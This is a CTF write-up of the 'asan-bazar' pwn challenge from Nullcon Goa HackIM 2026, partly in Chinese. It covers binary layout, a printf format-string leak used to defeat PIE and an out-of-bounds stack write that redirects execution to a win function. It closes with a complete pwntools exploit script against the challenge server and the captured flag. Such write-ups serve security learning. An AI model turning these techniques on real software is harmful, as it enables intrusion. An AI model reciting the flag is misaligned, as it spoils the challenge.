---
title: "asan-bazar - Nullcon Goa HackIM 2026 CTF"
category: "pwn"
subcategory: "format-string"
type: "writeup"
tags: ["format-string", "pwn", "pie", "canary", "lsb", "checksec", "objdump", "nullcon-goa-hackim-2026-ctf", "2026", "ctf-writeup"]
summary: "\\- Local directory: pwn/asan-bazar"
source:
  name: "CTFtime writeup #40552"
  url: "https://ctftime.org/writeup/40552"
ctf:
  name: "Nullcon Goa HackIM 2026 CTF"
  year: 2026
  challenge: "asan-bazar"
---

## Metadata

- **CTF:** Nullcon Goa HackIM 2026 CTF
- **Task:** asan-bazar
- **Author team:** 正规子群.AI
- **CTFtime tags:** format-string, pwn, pie
- **CTFtime:** <https://ctftime.org/writeup/40552>

---
## 123 asan-bazar

\- Category: `pwn`  
\- Value: `272`  
\- Solves: `77`  
\- Solved by me: `True`  
\- Local directory: `pwn/asan-bazar`

### 题目描述  
> come on in and buy some stuff of this bazar! its completly safe! its built with ASAN!

### 连接信息  
\- `52.59.124.14:5030`

### 附件下载地址  
\- `<https://ctf.nullcon.net/files/840d0fd68adac5c52077f6932026a7d2/chall?token=eyJ1c2VyX2lkIjo1MDYyLCJ0ZWFtX2lkIjoyMzEyLCJmaWxlX2lkIjo5NX0.aYqlQQ.cKeASAtOXx-ttz6u3_3w2DlEg20>`

### 内存布局  
\- Binary path: `pwn/asan-bazar/task/chall`  
\- File type: `ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=06364323fbfa06d62a7675546625f6e74058c9a7, for GNU/Linux 3.2.0, not stripped`  
\- arch: `x86`  
\- bits: `64`  
\- class: `ELF64`  
\- bintype: `elf`  
\- machine: `AMD x86-64 architecture`  
\- endian: `little`  
\- os: `linux`  
\- pic: `true`  
\- nx: `true`  
\- canary: `false`  
\- relro: `partial`  
\- stripped: `false`  
\- baddr: `0x0`

```text  
nth paddr size vaddr vsize perm flags type name  
――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――  
0 0x00000000 0x0 0x00000000 0x0 ---- 0x0 NULL  
1 0x00000350 0x1c 0x00000350 0x1c -r-- 0x2 PROGBITS .interp  
2 0x00000370 0x20 0x00000370 0x20 -r-- 0x2 NOTE .note.gnu.property  
3 0x00000390 0x24 0x00000390 0x24 -r-- 0x2 NOTE .note.gnu.build-id  
4 0x000003b4 0x20 0x000003b4 0x20 -r-- 0x2 NOTE .note.ABI-tag  
5 0x000003d8 0x3600 0x000003d8 0x3600 -r-- 0x2 GNU_HASH .gnu.hash  
6 0x000039d8 0xb820 0x000039d8 0xb820 -r-- 0x2 DYNSYM .dynsym  
7 0x0000f1f8 0xb480 0x0000f1f8 0xb480 -r-- 0x2 STRTAB .dynstr  
8 0x0001a678 0xf58 0x0001a678 0xf58 -r-- 0x2 GNU_VERSYM .gnu.version  
9 0x0001b5d0 0xc0 0x0001b5d0 0xc0 -r-- 0x2 GNU_VERNEED .gnu.version_r  
10 0x0001b690 0x20a0 0x0001b690 0x20a0 -r-- 0x2 RELA .rela.dyn  
11 0x0001d730 0x300 0x0001d730 0x300 -r-- 0x42 RELA .rela.plt  
12 0x0001e000 0x1b 0x0001e000 0x1b -r-x 0x6 PROGBITS .init  
13 0x0001e020 0x210 0x0001e020 0x210 -r-x 0x6 PROGBITS .plt  
14 0x0001e230 0x60 0x0001e230 0x60 -r-x 0x6 PROGBITS .plt.got  
15 0x0001e290 0xbe542 0x0001e290 0xbe542 -r-x 0x6 PROGBITS .text  
16 0x000dc7d4 0xd 0x000dc7d4 0xd -r-x 0x6 PROGBITS .fini  
17 0x000dd000 0x129b4 0x000dd000 0x129b4 -r-- 0x2 PROGBITS .rodata  
18 0x000ef9b4 0x53fc 0x000ef9b4 0x53fc -r-- 0x2 PROGBITS .eh_frame_hdr  
19 0x000f4db0 0x196b0 0x000f4db0 0x196b0 -r-- 0x2 PROGBITS .eh_frame  
20 0x0010e4f0 0x0 0x0010f4f0 0x54 -rw- 0x403 NOBITS .tbss  
21 0x0010e4f0 0x8 0x0010f4f0 0x8 -rw- 0x3 PREINIT_ARRAY .preinit_array  
22 0x0010e4f8 0x18 0x0010f4f8 0x18 -rw- 0x3 INIT_ARRAY .init_array  
23 0x0010e510 0x10 0x0010f510 0x10 -rw- 0x3 FINI_ARRAY .fini_array  
24 0x0010e520 0x7d0 0x0010f520 0x7d0 -rw- 0x3 PROGBITS .data.rel.ro  
25 0x0010ecf0 0x220 0x0010fcf0 0x220 -rw- 0x3 DYNAMIC .dynamic  
26 0x0010ef10 0xe0 0x0010ff10 0xe0 -rw- 0x3 PROGBITS .got  
27 0x0010f000 0x118 0x00110000 0x118 -rw- 0x3 PROGBITS .got.plt  
28 0x0010f120 0x2ee0 0x00110120 0x2ee0 -rw- 0x3 PROGBITS .data  
29 0x00112000 0x0 0x00113000 0x953918 -rw- 0x3 NOBITS .bss  
```

### WP  
# asan-bazar

\---

## 题目概览

目标服务：`52.59.124.14:5030`，flag 格式为 `ENO{}`。

程序是 64 位 PIE，开启 NX，且带 ASAN/UBSAN。静态分析发现存在 `win` 函数，会执行：

\- `execve("/bin/cat", ["/bin/cat", "/flag", NULL], NULL)`

因此利用目标是把控制流劫持到 `win`。

\---

## 静态分析过程

我先做了基础检查：

\- `file task/chall`  
\- `checksec --file=task/chall`  
\- `nm -n task/chall | rg 'win|main|greeting|read_u32|strip_newline'`  
\- `objdump -d task/chall --start-address=... --stop-address=...`  
\- `objdump -s -j .rodata task/chall --start-address=0xef420 --stop-address=0xefa20`

关键函数逻辑如下：

1\. `greeting` 读取 `username`（最多 `0x7f`），然后直接 `printf(username)`。  
2\. 后续读三个整数：  
\- `slot <= 128`  
\- `adj <= 15`  
\- `size <= 8`  
3\. 写入位置计算：

$$  
\text{dst} = \text{ledger} + (slot \ll 4) + adj  
$$

再执行 `read(0, dst, size)`。

这意味着有两个漏洞：

\- 格式化字符串漏洞（`printf(username)`）  
\- 可控 8 字节 OOB 写（最大偏移 $128\times16+15=2063$）

\---

## 动态验证与失败尝试

### 尝试 1：只用 OOB 猜返回地址偏移失败

我先猜了若干偏移（如 `0x160~0x190`）直接写 `win`，都没有触发。

失败原因：

\- 当时 `win` 地址基于 `%8$p` 计算，泄露源选错。

### 尝试 2：改用稳定 PIE 泄露 + 批量偏移搜索成功

通过 `%7$p` 泄露到的是 `.rodata` 指针，且可稳定映射到固定偏移：

\- 泄露偏移：`0xef957`  
\- `win` 偏移：`0xdbed0`

因此：

$$  
\text{base} = leak7 - 0xef957  
$$

$$  
\text{win} = \text{base} + 0xdbed0  
$$

随后枚举 `off`（步长 8）写 `p64(win)`，命中：

\- `off = 392 = 0x188`  
\- `slot = 24`  
\- `adj = 8`

命中后函数返回进入 `win`，输出 `/flag`。

\---

## 内存布局与利用点Pwn 要求

`greeting` 栈帧中的核心对象：

\- `username` 缓冲区（`0x80`）  
\- `ledger` 缓冲区（`0x80`）

程序对 `slot/adj` 做了“单维边界检查”，但没有对组合地址做“最终边界检查”。因此：

$$  
(slot, adj) \in [0,128] \times [0,15]  
$$

不代表：

$$  
\text{ledger} + (slot\times16+adj) \in [\text{ledger}, \text{ledger}+0x80)  
$$

最终可以越界写到栈上控制数据（返回地址链），完成控制流劫持。

\---

## 利用脚本

脚本路径：`solution/[solution.py](http://solution.py)`

特性：

\- 支持本地/远程切换（`args.REMOTE`）  
\- 自动泄露 PIE 基址（`%7$p`）  
\- 自动计算 `win`  
\- 通过 `slot=24, adj=8, size=8` 写入返回地址

运行：

```bash  
python3 solution/[solution.py](http://solution.py) REMOTE=1  
```

\---

## 最终 Flag

```text  
ENO{COMPILING_WITH_ASAN_DOESNT_ALWAYS_MEAN_ITS_SAFE!!!}  
```

### Exploit  
#### pwn/asan-bazar/solution/[solution.py](http://solution.py)

```python  
#!/usr/bin/env python3  
import os, sys  
# Ensure consistent terminal behavior  
os.environ.update({'PWNLIB_NOTERM': '1', 'TERM': 'linux'})

# KEEP EXACTLY AS IS: prevents namespace conflict with math.log  
from pwn import process, remote, ssh, context, log as pwnlog  
from pwn import p64, args

context.log_level = 'DEBUG' # Never hide logs initially

HOST = '52.59.124.14'  
PORT = 5030

RODATA_LEAK_OFF = 0xEF957  
WIN_OFF = 0xDBED0  
RET_OVERWRITE_OFF = 392 # slot=24, adj=8

def start():  
if args.REMOTE:  
return remote(HOST, PORT)  
return process('./task/chall')

def recv_leak(io):  
io.sendafter(b'Name:', b'%7$p\n')  
io.recvuntil(b'whole market:\n')  
line = io.recvline().strip()  
if not line.startswith(b'0x'):  
raise ValueError(f'unexpected leak line: {line!r}')  
leak = int(line, 16)  
[pwnlog.info](http://pwnlog.info)(f'leak(.rodata ptr) = {hex(leak)}')  
return leak

def exploit(io):  
leak = recv_leak(io)  
base = leak - RODATA_LEAK_OFF  
win = base + WIN_OFF  
[pwnlog.info](http://pwnlog.info)(f'pie base = {hex(base)}')  
[pwnlog.info](http://pwnlog.info)(f'win = {hex(win)}')

slot = RET_OVERWRITE_OFF // 16  
adj = RET_OVERWRITE_OFF % 16

io.sendlineafter(b'(slot index 0..128):', str(slot).encode())  
io.sendlineafter(b'(0..15):', str(adj).encode())  
io.sendlineafter(b'(max 8):', b'8')  
io.sendafter(b'Ink (raw bytes):', p64(win))

data = io.recvall(timeout=3)  
text = data.decode('latin-1', 'ignore')  
print(text)

if 'ENO{' not in text:  
raise RuntimeError('flag not found in output')

def main():  
io = start()  
try:  
exploit(io)  
finally:  
io.close()

if __name__ == '__main__':  
main()  
```

\---
